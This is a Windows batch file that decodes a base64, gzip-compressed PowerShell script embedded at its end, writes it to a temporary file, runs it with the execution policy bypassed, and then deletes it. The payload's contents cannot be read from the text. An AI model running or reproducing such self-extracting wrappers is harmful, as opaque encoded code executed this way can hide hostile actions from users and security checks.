@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
set "temp_file=%temp%\MyBatch_%random%_%random%_%random%_%random%.ps1"
set "self_path=%~f0"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$lines = Get-Content -LiteralPath $env:self_path -Encoding utf8;" ^
    "$startIndex = -1;" ^
    "$endIndex = -1;" ^
    "for ($i = 0; $i -lt $lines.Length; $i++) {" ^
    "    if ($lines[$i] -eq '-----BEGIN POWERSHELL GZIP-----') {" ^
    "        $startIndex = $i;" ^
    "        break;" ^
    "    }" ^
    "}" ^
    "if ($startIndex -eq -1) {" ^
    "    Write-Error 'BEGIN marker not found';" ^
    "    exit 1;" ^
    "}" ^
    "for ($i = $startIndex + 1; $i -lt $lines.Length; $i++) {" ^
    "    if ($lines[$i] -eq '-----END POWERSHELL GZIP-----') {" ^
    "        $endIndex = $i;" ^
    "        break;" ^
    "    }" ^
    "}" ^
    "if ($endIndex -eq -1) {" ^
    "    Write-Error 'END marker not found';" ^
    "    exit 1;" ^
    "}" ^
    "if ($endIndex - $startIndex -le 1) {" ^
    "    Write-Error 'Base64 content not found';" ^
    "    exit 1;" ^
    "}" ^
    "$base64Lines = $lines[($startIndex+1)..($endIndex-1)];" ^
    "$base64 = $base64Lines -join '';" ^
    "$base64 = $base64 -replace '\s', '';" ^
    "$bytes = [Convert]::FromBase64String($base64);" ^
    "$ms = New-Object System.IO.MemoryStream (,$bytes);" ^
    "$gzip = New-Object System.IO.Compression.GzipStream($ms, [System.IO.Compression.CompressionMode]::Decompress);" ^
    "$outMs = New-Object System.IO.MemoryStream;" ^
    "$gzip.CopyTo($outMs);" ^
    "$gzip.Close();" ^
    "$ms.Close();" ^
    "$rawBytes = $outMs.ToArray();" ^
    "$outMs.Close();" ^
    "[System.IO.File]::WriteAllBytes($env:temp_file, $rawBytes);" ^
    "& $env:temp_file;" ^
    "exit $LASTEXITCODE;"

set exitcode=%errorlevel%
if exist "%temp_file%" del "%temp_file%" 2>nul
exit /b %exitcode%

-----BEGIN POWERSHELL GZIP-----
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
ZBbs25ebAAA=
-----END POWERSHELL GZIP-----
